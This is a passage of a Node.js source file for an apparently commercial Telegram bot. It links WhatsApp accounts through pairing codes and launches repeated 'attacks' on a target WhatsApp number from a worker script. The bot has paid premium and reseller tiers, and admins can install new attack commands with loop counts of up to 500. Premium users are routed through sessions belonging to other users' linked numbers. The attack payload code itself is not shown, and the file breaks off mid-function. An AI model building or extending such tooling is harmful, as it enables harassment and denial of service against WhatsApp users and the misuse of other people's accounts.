require('dotenv').config();
process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const { default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const pino = require('pino');
const { Worker } = require('worker_threads');
const cmdBuilder = require('./cmdBuilder');
const userManager = require('./userManager');

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
console.clear();

process.on('uncaughtException', (err) => {
    if (err.message && err.message.includes('WebSocket was closed')) return;
    console.error('[CRITICAL ERROR]', err);
});
process.on('unhandledRejection', (reason) => {
    if (reason && reason.message && reason.message.includes('WebSocket was closed')) return;
    console.error('[CRITICAL ERROR]', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) fs.mkdirSync(LoveDir);

const activeBots = {};
const startTime = Date.now();
const LoveLogo = config.logo;
const waSessions = {};
const unauthorized = '⛔ You are not authorized to use this command.';
const SILENT_LOGGER = pino({ level: 'silent' });

const processedMessages = new Map();
function isDuplicateMessage(messageId) {
    const now = Date.now();
    if (processedMessages.has(messageId)) return true;
    processedMessages.set(messageId, now);
    if (processedMessages.size > 1000) {
        const cutoff = now - 60000;
        for (const [id, ts] of processedMessages.entries()) {
            if (ts < cutoff) processedMessages.delete(id);
        }
    }
    return false;
}

async function downloadTelegramFile(S7, fileId, token) {
    const fileLink = await S7.getFileLink(fileId);
    let fileUrl = typeof fileLink === 'string' ? fileLink : (fileLink?.href || fileLink?.toString?.() || '');
    if (!fileUrl || !fileUrl.startsWith('http')) {
        if (fileUrl && token) fileUrl = `https://api.telegram.org/file/bot${token}/${fileUrl}`;
        else throw new Error('Invalid URL');
    }
    const https = require('https');
    const http = require('http');
    return new Promise((resolve, reject) => {
        const makeRequest = (url, redirectCount = 0) => {
            if (redirectCount > 5) return reject(new Error('Too many redirects'));
            const reqClient = url.startsWith('https') ? https : http;
            reqClient.get(url, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    return makeRequest(res.headers.location, redirectCount + 1);
                }
                if (res.statusCode !== 200) return reject(new Error(`HTTP ${res.statusCode}`));
                let data = '';
                res.setEncoding('utf8');
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve(data));
                res.on('error', reject);
            }).on('error', reject);
        };
        makeRequest(fileUrl);
    });
}

const GLOBAL_COOLDOWN_MS = 60 * 1000;
const globalCooldownMap = {};
function isOnCooldown(userId) {
    const lastUsed = globalCooldownMap[userId];
    if (!lastUsed) return 0;
    const elapsed = Date.now() - lastUsed;
    const remaining = GLOBAL_COOLDOWN_MS - elapsed;
    return remaining > 0 ? Math.ceil(remaining / 1000) : 0;
}
function setCooldown(userId) { globalCooldownMap[userId] = Date.now(); }

const colors = {
    reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
    red: "\x1b[31m", magenta: "\x1b[35m", cyan: "\x1b[36m", yellow: "\x1b[33m"
};

function getRuntime() {
    const diff = Date.now() - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days}d ${hours}h ${minutes}m`;
}

function log(type, user, message) {
    const time = new Date().toLocaleTimeString();
    const timestamp = `${colors.gray}[${time}]${colors.reset}`;
    let typeTag = "";
    if (type === 'info') typeTag = `${colors.blue}INFO${colors.reset}`;
    if (type === 'success') typeTag = `${colors.green}SUCCESS${colors.reset}`;
    if (type === 'error') typeTag = `${colors.red}ERROR${colors.reset}`;
    if (type === 'command') typeTag = `${colors.magenta}CMD${colors.reset}`;
    const userTag = user ? `${colors.cyan}${user}${colors.reset}` : "SYSTEM";
    console.log(`${timestamp} | ${typeTag} | ${userTag} | ${message}`);
}

// ==================== PREMIUM DURATION HELPERS ====================
function parseDuration(str) {
    if (!str) return null;
    const s = String(str).toLowerCase().trim();
    if (s === 'perm' || s === 'permanent' || s === 'forever' || s === '0' || s === 'life') return null;
    const match = s.match(/^(\d+)\s*(d|day|days|h|hr|hrs|hour|hours|m|min|mins|minute|minutes|w|week|weeks|mo|month|months|y|year|years)$/);
    if (!match) return NaN;
    const num = parseInt(match[1]);
    const unit = match[2];
    let ms = 0;
    if (['d', 'day', 'days'].includes(unit)) ms = num * 24 * 60 * 60 * 1000;
    else if (['h', 'hr', 'hrs', 'hour', 'hours'].includes(unit)) ms = num * 60 * 60 * 1000;
    else if (['m', 'min', 'mins', 'minute', 'minutes'].includes(unit)) ms = num * 60 * 1000;
    else if (['w', 'week', 'weeks'].includes(unit)) ms = num * 7 * 24 * 60 * 60 * 1000;
    else if (['mo', 'month', 'months'].includes(unit)) ms = num * 30 * 24 * 60 * 60 * 1000;
    else if (['y', 'year', 'years'].includes(unit)) ms = num * 365 * 24 * 60 * 60 * 1000;
    return ms;
}

function formatExpiry(expiresAt) {
    if (!expiresAt) return '♾️ Permanent';
    const diff = expiresAt - Date.now();
    if (diff <= 0) return '❌ Expired';
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const mins = Math.floor((diff / (1000 * 60)) % 60);
    if (days > 0) return `${days}d ${hours}h left`;
    if (hours > 0) return `${hours}h ${mins}m left`;
    return `${mins}m left`;
}

function normalizePremium(premiumArr) {
    if (!Array.isArray(premiumArr)) return [];
    return premiumArr.map(p => {
        if (typeof p === 'string' || typeof p === 'number') {
            return { id: p.toString(), expiresAt: null };
        }
        if (p && typeof p === 'object' && p.id) {
            return { id: p.id.toString(), expiresAt: p.expiresAt || null };
        }
        return null;
    }).filter(Boolean);
}

function cleanExpiredPremium(premiumArr) {
    const now = Date.now();
    let changed = false;
    const cleaned = premiumArr.filter(p => {
        if (!p.expiresAt) return true;
        if (p.expiresAt > now) return true;
        changed = true;
        return false;
    });
    return { premium: cleaned, changed };
}

// ==================== DATABASE ====================
const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return { state: 0, tokens: [], premium: [], resellers: [] };
    try {
        const parsed = JSON.parse(fs.readFileSync(dbPath));
        if (Array.isArray(parsed)) return { state: 0, tokens: parsed, premium: [], resellers: [] };
        return {
            state: typeof parsed.state === 'number' ? parsed.state : 0,
            tokens: parsed.tokens || [],
            premium: normalizePremium(parsed.premium || []),
            resellers: (parsed.resellers || []).map(r => r.toString())
        };
    } catch (err) { return { state: 0, tokens: [], premium: [], resellers: [] }; }
};

const saveDB = (data) => {
    try { fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2)); } catch (err) {}
};

function sendSYLove(bot, chatId) {
    bot.sendMessage(chatId,
        `<tg-emoji emoji-id="5974083768233760323">⛔</tg-emoji> ACCESS DENIED\n\n` +
        `Contact: ${config.S7}\n\n` +
        `<tg-emoji emoji-id="5352787233852116219">🪙</tg-emoji> Pricing:\n` +
        `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Permanent Access: $15\n` +
        `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Permanent Resell: $30\n` +
        `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Full Script: $100`,
        { parse_mode: "HTML" }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    const uid = userId.toString();
    if (uid === config.adminId.toString()) return true;
    if (db.resellers.includes(uid)) return true;
    const prem = db.premium.find(p => p.id === uid);
    if (prem && (!prem.expiresAt || prem.expiresAt > Date.now())) return true;
    return false;
}

function isPremiumUser(userId) {
    const db = getDB();
    const uid = userId.toString();
    if (uid === config.adminId.toString()) return true;
    if (db.resellers.includes(uid)) return true;
    const prem = db.premium.find(p => p.id === uid);
    return !!(prem && (!prem.expiresAt || prem.expiresAt > Date.now()));
}

function GetSessionForUser(userId, chatId) {
    let db = getDB();
    const uid = userId.toString();
    const isPremium = (
        uid === config.adminId.toString() ||
        db.resellers.includes(uid) ||
        (db.premium.find(p => p.id === uid && (!p.expiresAt || p.expiresAt > Date.now())))
    );
    let eligibleSessions = [];
    if (isPremium) {
        Object.values(waSessions).forEach(sessions => {
            if (Array.isArray(sessions)) sessions.forEach(s => eligibleSessions.push(s));
        });
        if (eligibleSessions.length === 0) return { error: '<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> No number connected globally.\n\nContact owner or wait for sometime.' };
        return eligibleSessions[Math.floor(Math.random() * eligibleSessions.length)];
    } else {
        if (!waSessions[chatId] || waSessions[chatId].length === 0) return { error: '<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> No number connected.\n\nUse /reqpair to connect your number.' };
        return waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    }
}

// ==================== FORCE JOIN (CHANNEL + GROUP) ====================
async function getChatId(S7, username) {
    try {
        if (!username) return null;
        const chat = await S7.getChat(username);
        return chat.id;
    } catch (e) {
        console.log(`[FORCE JOIN] getChat failed for ${username}: ${e.message}`);
        return null;
    }
}

async function isUserJoinedOne(S7, chatId, username) {
    try {
        const targetId = await getChatId(S7, username);
        if (!targetId) {
            console.log(`[FORCE JOIN] Cannot resolve ${username} — blocking`);
            return false;
        }
        const member = await S7.getChatMember(targetId, chatId);
        const status = member.status;
        const joined = ['member', 'administrator', 'creator'].includes(status);
        console.log(`[FORCE JOIN] ${username} | user ${chatId} → ${status} → ${joined ? 'JOINED' : 'NOT JOINED'}`);
        return joined;
    } catch (e) {
        console.log(`[FORCE JOIN] ${username} check failed: ${e.message}`);
        return false;
    }
}

async function isUserJoined(S7, chatId) {
    const channelJoined = await isUserJoinedOne(S7, chatId, config.forceChannelUsername);
    const groupJoined = await isUserJoinedOne(S7, chatId, config.forceGroupUsername);
    return {
        joined: channelJoined && groupJoined,
        channel: channelJoined,
        group: groupJoined
    };
}

async function sendForceJoin(S7, chatId, status) {
    const channelUrl = config.channel || ('https://t.me/' + (config.channelId || '').replace('@', ''));
    const groupUrl = config.group || ('https://t.me/' + (config.groupId || '').replace('@', ''));
    const channelStatus = status.channel ? '✅' : '❌';
    const groupStatus = status.group ? '✅' : '❌';
    const keyboard = {
        inline_keyboard: [
            [{ text: `📢 Join Channel ${channelStatus}`, url: channelUrl }],
            [{ text: `👥 Join Group ${groupStatus}`, url: groupUrl }],
            [{ text: '✅ I Joined Both', callback_data: 'check_join' }]
        ]
    };
    await S7.sendMessage(chatId,
        `<tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji> *Force Join Required*\n\n` +
        `To use this bot join these channel:\n\n` +
        `${channelStatus} Channel\n` +
        `${groupStatus} Group\n\n` +
        ``,
        { parse_mode: "HTML", reply_markup: keyboard }
    ).catch(() => {});
}
// ==================== END FORCE JOIN ====================

async function StartLovingSY(chatId, number, S7, retryCount = 0) {
    const authPath = `./Love/auth/${chatId}/${number}`;
    const isNewLogin = !fs.existsSync(path.join(authPath, 'creds.json'));
    if (!fs.existsSync(authPath)) fs.mkdirSync(authPath, { recursive: true });
    let SYxS7 = null;
    let pairingFailed = false;
    let connectionTimeout = null;
    let isResolved = false;
    const safeEnd = () => {
        if (!SYxS7) return;
        try {
            if (SYxS7.ws && SYxS7.ws.readyState !== 3 && SYxS7.ws.readyState !== 2) SYxS7.end(undefined);
        } catch (e) {}
    };
    try {
        const { state, saveCreds } = await useMultiFileAuthState(authPath);
        SYxS7 = makeWASocket({
            logger: SILENT_LOGGER,
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, SILENT_LOGGER),
            },
            browser: ['Mac OS', 'Safari', '10.15.7'],
            markOnlineOnConnect: true,
            connectTimeoutMs: 30000,
            defaultQueryTimeoutMs: 30000,
            keepAliveIntervalMs: 25000,
            retryRequestDelayMs: 1500,
            generateHighQualityLinkPreview: false,
            syncFullHistory: false,
            shouldIgnoreJid: () => true,
            getMessage: async () => undefined,
        });
        if (!SYxS7.authState.creds.registered) {
            await delay(1500);
            try {
                let code;
                let pairAttempts = 0;
                while (pairAttempts < 3) {
                    try {
                        code = await SYxS7.requestPairingCode(number, `NAVIYA10`);
                        if (code) break;
                    } catch (e) {
                        log('error', 'WhatsApp', `Pair attempt ${pairAttempts + 1} failed: ${e.message}`);
                        await delay(3000);
                    }
                    pairAttempts++;
                }
                if (!code) throw new Error('Pairing code request failed after 3 attempts');
                const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
                await S7.sendMessage(chatId,
                    `<tg-emoji emoji-id="5974083768233760323">🔑</tg-emoji> PAIRING CODE\n\n` +
                    `<tg-emoji emoji-id="5332656211034652890">📱</tg-emoji> Number: +${number}\n` +
                    `<tg-emoji emoji-id="5974083768233760323">🔐</tg-emoji> Code: ${formattedCode}\n\n` +
                    `Open WhatsApp > Linked Devices > Link a Device\n\n` +
                    `⏰ You have *2 minutes* to enter the code.`,
                    { parse_mode: "HTML" }
                ).catch(() => {});
                connectionTimeout = setTimeout(async () => {
                    if (SYxS7 && !SYxS7.authState.creds.registered && !isResolved) {
                        log('error', 'WhatsApp', `Pairing timeout: ${number}`);
                        await S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">⏰</tg-emoji> *Pairing Timeout*\n\nNumber: +${number}\n\nPlease use /reqpair again.`, { parse_mode: "HTML" }).catch(() => {});
                        safeEnd();
                        setTimeout(() => { try { if (fs.existsSync(authPath)) fs.rmSync(authPath, { recursive: true, force: true }); } catch (e) {} }, 2000);
                    }
                }, 120000);
            } catch (err) {
                pairingFailed = true;
                isResolved = true;
                log('error', 'WhatsApp', `Pairing error: ${err.message}`);
                if (connectionTimeout) { clearTimeout(connectionTimeout); connectionTimeout = null; }
                safeEnd();
                setTimeout(() => { try { if (fs.existsSync(authPath)) fs.rmSync(authPath, { recursive: true, force: true }); } catch (e) {} }, 2000);
                await S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> *Pairing Failed*\n\nNumber: +${number}\nReason: ${err.message}\n\nPlease try again with /reqpair`, { parse_mode: "HTML" }).catch(() => {});
                return;
            }
        }
        SYxS7.ev.on('creds.update', saveCreds);
        SYxS7.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
                if (isResolved) return;
                isResolved = true;
                if (connectionTimeout) { clearTimeout(connectionTimeout); connectionTimeout = null; }
                log('success', 'WhatsApp', `Connected: ${number}`);
                if (!waSessions[chatId]) waSessions[chatId] = [];
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
                waSessions[chatId].push({ sock: SYxS7, num: number, authPath });
                if (isNewLogin) {
                    setTimeout(async () => {
                        await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> WhatsApp Connected!\n\n<tg-emoji emoji-id="5332656211034652890">📱</tg-emoji> Number: +${number}`, { parse_mode: "HTML" }).catch(() => {});
                    }, 500);
                }
            }
            if (connection === "close") {
                if (connectionTimeout) { clearTimeout(connectionTimeout); connectionTimeout = null; }
                if (waSessions[chatId]) waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
                if (isResolved) return;
                let reason = lastDisconnect?.error?.output?.statusCode;
                if (reason === DisconnectReason.loggedOut || reason === 401) {
                    log('error', 'WhatsApp', `Logged out: ${number}`);
                    setTimeout(() => { try { if (fs.existsSync(authPath)) fs.rmSync(authPath, { recursive: true, force: true }); } catch (e) {} }, 2000);
                } else if (reason === DisconnectReason.restartRequired) {
                    if (retryCount < 1 && !pairingFailed) setTimeout(() => StartLovingSY(chatId, number, S7, retryCount + 1), 15000);
                } else if (reason === DisconnectReason.connectionLost || reason === DisconnectReason.timedOut) {
                    if (retryCount < 1 && !pairingFailed) setTimeout(() => StartLovingSY(chatId, number, S7, retryCount + 1), 20000);
                } else if (reason === 515 || reason === 500) {
                    if (retryCount < 1 && !pairingFailed) setTimeout(() => StartLovingSY(chatId, number, S7, retryCount + 1), 20000);
                }
            }
        });
    } catch (error) {
        if (connectionTimeout) { clearTimeout(connectionTimeout); connectionTimeout = null; }
        log('error', 'WhatsApp', `Start error: ${error.message}`);
        safeEnd();
        if (!pairingFailed && retryCount < 1) setTimeout(() => StartLovingSY(chatId, number, S7, retryCount + 1), 6000);
    }
}

async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        const allSessions = [];
        const seenNumbers = new Set();
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                if (seenNumbers.has(number)) continue;
                if (fs.existsSync(path.join(chatPath, number, 'creds.json'))) {
                    seenNumbers.add(number);
                    allSessions.push({ chatId, number });
                }
            }
        }
        const BATCH_SIZE = 2;
        for (let i = 0; i < allSessions.length; i += BATCH_SIZE) {
            const batch = allSessions.slice(i, i + BATCH_SIZE);
            log('info', 'SYSTEM', `Starting batch ${Math.floor(i/BATCH_SIZE)+1}: ${batch.length} sessions`);
            await Promise.all(batch.map(session => new Promise(resolve => {
                setTimeout(() => { StartLovingSY(session.chatId, session.number, S7); resolve(); }, 500);
            })));
            await sleep(3000);
        }
    } catch (err) {}
}

async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(tokenObj.owner, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Token Error\n\nYour bot token is not working.\nReason: ${errorMsg}`, { parse_mode: "HTML" });
        }
    } catch (e) {}
    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);
    if (activeBots[token]) {
        try { await activeBots[token].stopPolling(); } catch {}
        delete activeBots[token];
    }
}

function GetSYLoVe(love) {
    const db = getDB();
    const uid = love.toString();
    if (uid === config.adminId.toString()) return 'Owner';
    if (db.resellers.includes(uid)) return 'Reseller';
    const prem = db.premium.find(p => p.id === uid);
    if (prem && (!prem.expiresAt || prem.expiresAt > Date.now())) {
        return `Premium (${formatExpiry(prem.expiresAt)})`;
    }
    return 'Free User';
}

function MainSYLoVe(name, uptime, love) {
    const status = GetSYLoVe(love);
    return `<tg-emoji emoji-id="5393584681520209609">🟩</tg-emoji> ${config.bot} <tg-emoji emoji-id="5393584681520209609">🟩</tg-emoji>\n\n<tg-emoji emoji-id="5391197057660756536">🔥</tg-emoji> User: ${name} <tg-emoji emoji-id="4972175203539878625">👺</tg-emoji>\n<tg-emoji emoji-id="5400016846017548469">🧍‍♂️</tg-emoji> Status: ${status} <tg-emoji emoji-id="4969836967509361841">⚡️</tg-emoji>\n<tg-emoji emoji-id="4972341027932210997">🐋</tg-emoji> Uptime: ${uptime} <tg-emoji emoji-id="5204331882539425706">🌙</tg-emoji>`;
}

function BvgSYLoVe(cleanTarget) {
    return `<tg-emoji emoji-id="5373290243787070962">⚡</tg-emoji> ATTACK STARTED\n\n<tg-emoji emoji-id="5433758796289685818">🎯</tg-emoji> Target: ${cleanTarget}\n<tg-emoji emoji-id="4918408122868958076">📤</tg-emoji> Status: Sending...`;
}

function AttackCompleted(cleanTarget, commandName, success, failed, total) {
    return `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> ATTACK COMPLETED\n\n` +
           `<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> Command: ${commandName}\n` +
           `<tg-emoji emoji-id="5433758796289685818">🎯</tg-emoji> Target: ${cleanTarget}\n` +
           `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Success: ${success}\n` +
           `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Failed: ${failed}\n` +
           `<tg-emoji emoji-id="4918408122868958076">📊</tg-emoji> Total: ${total}`;
}

function runAttackInWorker(attackType, authPath, targetJid, count, chatId, commandName, cleanTarget, S7) {
    const worker = new Worker(path.join(__dirname, 'attackWorker.js'), {
        workerData: { authPath, attackType, targetJid, count }
    });
    worker.on('message', (msg) => {
        if (msg.type === 'done') {
            S7.sendPhoto(chatId, LoveLogo, { caption: AttackCompleted(cleanTarget, commandName, msg.success, msg.failed, msg.total), parse_mode: "HTML" }).catch(() => {
                S7.sendMessage(chatId, AttackCompleted(cleanTarget, commandName, msg.success, msg.failed, msg.total), { parse_mode: "HTML" }).catch(() => {});
            });
        } else if (msg.type === 'error') {
            console.error(`[${commandName}] Worker error:`, msg.error);
            S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Error in ${commandName}: ${msg.error}`, { parse_mode: "HTML" }).catch(() => {});
        }
    });
    worker.on('error', (err) => {
        console.error(`[${commandName}] Worker crashed:`, err.message);
        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> ${commandName} crashed: ${err.message}`, { parse_mode: "HTML" }).catch(() => {});
    });
    return worker;
}

function extractUserIdsFromList() {
    const listPath = path.join(LoveDir, 'list.txt');
    if (!fs.existsSync(listPath)) return [];
    try {
        const content = fs.readFileSync(listPath, 'utf8');
        const userIds = [];
        for (const line of content.split('\n')) {
            const match = line.match(/\((\d+)\)/);
            if (match && !match[1].startsWith('-')) userIds.push(match[1]);
        }
        return userIds;
    } catch (err) { return []; }
}

// ==================== AUTO-EXPIRE PREMIUM (background) ====================
setInterval(() => {
    try {
        const db = getDB();
        const { premium, changed } = cleanExpiredPremium(db.premium);
        if (changed) {
            db.premium = premium;
            saveDB(db);
            log('info', 'PREMIUM', `Auto-removed expired premium users`);
        }
    } catch (e) {}
}, 5 * 60 * 1000);

// ==================== START BOT FUNCTION ====================
function startSYloveBot(token) {
    try {
        const tempBot = new SY(token, { polling: false });
        tempBot.deleteWebHook({ drop_pending_updates: true }).catch(() => {});
        tempBot.getUpdates({ offset: -1, limit: 1, timeout: 0 }).catch(() => {});

        setTimeout(() => {
            const S7 = new SY(token, {
                polling: {
                    interval: 1000,
                    autoStart: true,
                    params: { timeout: 30, limit: 50 }
                }
            });
            activeBots[token] = S7;
            console.log('[POLLING] Started:', token.substring(0, 15) + '...');

            const pendingCmdBuilder = {};
            const pendingChangeLoop = {};
            const pendingUserImport = {};
            const pendingTxtImport = {};
            const pendingBroadcastMsg = {};
            const pendingBroadcastData = {};

            // ==================== WIZARDS ====================
            const wizardAddNewCmd = async (msg) => {
                if (!msg.text) return;
                const userId = msg.from.id.toString();
                const pending = pendingCmdBuilder[userId];
                if (!pending) return;
                const chatId = msg.chat.id.toString();
                const text = msg.text.trim();
                if (pending.step === 'awaiting_cmdname') {
                    const cmdName = text.replace(/^\//, '').toLowerCase();
                    if (!/^[a-z][a-z0-9_]*$/.test(cmdName)) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Invalid name.`, { parse_mode: "HTML" });
                    const existing = cmdBuilder.getAllCommandsWithBuiltIn().find(c => c.cmdName === cmdName);
                    if (existing) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Command /${cmdName} already exists!`);
                    pending.cmdName = cmdName;
                    pending.step = 'awaiting_platform';
                    await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Command: <code>/${cmdName}</code>\n\n<tg-emoji emoji-id="5454008471873669821">📱</tg-emoji> *Step 2/3:* Reply <b>1</b> (Android) or <b>2</b> (iOS)`, { parse_mode: "HTML" });
                    return;
                }
                if (pending.step === 'awaiting_platform') {
                    let platform;
                    if (text === '1' || text.toLowerCase() === 'android') platform = 'android';
                    else if (text === '2' || text.toLowerCase() === 'ios') platform = 'ios';
                    else return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Reply <b>1</b> or <b>2</b>`, { parse_mode: "HTML" });
                    pending.platform = platform;
                    pending.step = 'awaiting_count';
                    await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Platform: <b>${platform.toUpperCase()}</b>\n\n<tg-emoji emoji-id="4918408122868958076">🔁</tg-emoji> *Step 3/3:* Send loop count`, { parse_mode: "HTML" });
                    return;
                }
                if (pending.step === 'awaiting_count') {
                    const count = parseInt(text);
                    if (isNaN(count) || count < 1 || count > 500) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Send number 1-500`);
                    await S7.sendMessage(chatId, `<tg-emoji emoji-id="5456140674028019486">🔄</tg-emoji> Installing...`);
                    try {
                        const result = cmdBuilder.addNewCommand(pending.code, pending.cmdName, pending.platform, count);
                        if (!result.success) {
                            delete pendingCmdBuilder[userId];
                            return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Failed: ${result.error}`, { parse_mode: "HTML" });
                        }
                        delete pendingCmdBuilder[userId];
                        await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *COMMAND INSTALLED!*\n\n<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> /${result.cmdName}\n<tg-emoji emoji-id="5332656211034652890">📱</tg-emoji> ${result.platform.toUpperCase()}\n<tg-emoji emoji-id="4918408122868958076">🔁</tg-emoji> ${result.count}x\n\n<tg-emoji emoji-id="5447644880824181073">⚠️</tg-emoji> *Restart bot!*`, { parse_mode: "HTML" });
                    } catch (err) {
                        delete pendingCmdBuilder[userId];
                        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Error: ${err.message}`);
                    }
                    return;
                }
            };

            const wizardChangeLoop = async (msg) => {
                if (!msg.text) return;
                const userId = msg.from.id.toString();
                const pending = pendingChangeLoop[userId];
                if (!pending) return;
                const chatId = msg.chat.id.toString();
                const text = msg.text.trim();
                if (pending.step === 'awaiting_loop') {
                    const newCount = parseInt(text);
                    if (isNaN(newCount) || newCount < 1 || newCount > 500) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Send number 1-500`);
                    delete pendingChangeLoop[userId];
                    await S7.sendMessage(chatId, `<tg-emoji emoji-id="5456140674028019486">🔄</tg-emoji> Updating loop...`);
                    try {
                        const result = cmdBuilder.changeLoop(pending.cmdName, newCount);
                        if (!result.success) return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Failed: ${result.error}`);
                        await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *LOOP UPDATED!*\n\n<tg-emoji emoji-id="5260450573768990626">📋</tg-emoji> /${result.cmdName}\n<tg-emoji emoji-id="4918408122868958076">📊</tg-emoji> Old: ${result.oldCount}x\n<tg-emoji emoji-id="4918408122868958076">📊</tg-emoji> New: ${result.newCount}x\n\n<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> Active immediately!`, { parse_mode: "HTML" });
                    } catch (err) { S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Error: ${err.message}`); }
                    return;
                }
            };

            const wizardUserImport = async (msg) => {
                const userId = msg.from.id.toString();
                const chatId = msg.chat.id.toString();
                if (msg.text) {
                    const text = msg.text.trim();
                    try {
                        let importData = JSON.parse(text);
                        let usersToImport = [];
                        if (Array.isArray(importData)) usersToImport = importData;
                        else if (importData.users && Array.isArray(importData.users)) usersToImport = importData.users;
                        else { delete pendingUserImport[userId]; return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> *Invalid Format*`, { parse_mode: 'HTML' }); }
                        if (usersToImport.length === 0) { delete pendingUserImport[userId]; return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> No users found.`); }
                        const result = userManager.bulkImportUsers(usersToImport);
                        delete pendingUserImport[userId];
                        await S7.sendMessage(chatId, `<tg-emoji emoji-id="5123248930124989216">✅</tg-emoji> *IMPORT SUCCESSFUL*\n\n<tg-emoji emoji-id="5197429921634346862">➕</tg-emoji> Added: ${result.added}\n<tg-emoji emoji-id="5456140674028019486">🔄</tg-emoji> Updated: ${result.updated}\n<tg-emoji emoji-id="5433758796289685818">👥</tg-emoji> Total: ${result.total}\n\n<tg-emoji emoji-id="5123248930124989216">💎</tg-emoji> Premium: ${result.premiumAdded}\n<tg-emoji emoji-id="5123248930124989216">🏪</tg-emoji> Reseller: ${result.resellerAdded}`, { parse_mode: 'HTML' });
                    } catch (err) {
                        delete pendingUserImport[userId];
                        S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Invalid JSON: ${err.message}`);
                    }
                    return;
                }
                if (msg.document) {
                    try {
                        const fileName = msg.document.file_name || '';
                        if (!fileName.endsWith('.json')) { delete pendingUserImport[userId]; return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Only .json files.`); }
                        const jsonText = await downloadTelegramFile(S7, msg.document.file_id, token);
                        const importData = JSON.parse(jsonText);
                        let usersToImport = [];
                        if (Array.isArray(importData)) usersToImport = importData;
                        else if (importData.users && Array.isArray(importData.users)) usersToImport = importData.users;
                        else { delete pendingUserImport[userId]; return S7.sendMessage(chatId, `<tg-emoji emoji-id="5974083768233760323">❌</tg-emoji> Invalid format.`); }
                        const result = userManager.bulkImportUsers(usersToImport);
                        delete pendingUserImport[userId];
